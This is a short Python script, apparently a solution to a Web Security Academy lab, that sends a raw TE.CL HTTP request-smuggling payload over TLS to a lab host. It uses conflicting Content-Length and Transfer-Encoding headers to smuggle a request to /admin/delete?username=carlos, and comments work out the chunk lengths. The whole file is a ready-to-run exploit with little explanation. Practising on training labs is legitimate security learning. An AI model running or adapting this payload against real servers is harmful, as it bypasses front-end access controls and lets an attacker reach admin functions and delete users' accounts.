import socket
import ssl

host = '0a8e0021035bd012812bde37003e0039.web-security-academy.net'
port = 443

# Smuggling payload (TE.CL)

payload = (
    "POST / HTTP/1.1\r\n"
    f"Host: {host}\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-length: 4\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "87\r\n"
    "GET /admin/delete?username=carlos HTTP/1.1\r\n"
    "Host: localhost\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 15\r\n"
    "\r\n"
    "x=1\r\n"
    "0\r\n"
    "\r\n"
)

# body = (
#     "GET /admin/delete?username=carlos HTTP/1.1\r\n"
#     "Host: localhost\r\n"
#     "Content-Type: application/x-www-form-urlencoded\r\n"
#     "Content-Length: 15\r\n"
#     "\r\n"
#     "x=1"
# )
# print(hex(len(body))) # 0x89 
# Content-Length (line20) > len("x=1\r\n0\r\n\r\n")=10 to true payload
# Content-length (line 13) = 4 = ("87\r\n")

def send_raw_https(host, port, raw_payload):
    context = ssl.create_default_context()
    with socket.create_connection((host, port)) as sock:
        with context.wrap_socket(sock, server_hostname=host) as ssock:
            ssock.sendall(raw_payload.encode())
            response = ssock.recv(4096)
            print(response.decode(errors="ignore"))

print("[+] Sending smuggling payload...")
send_raw_https(host, port, payload)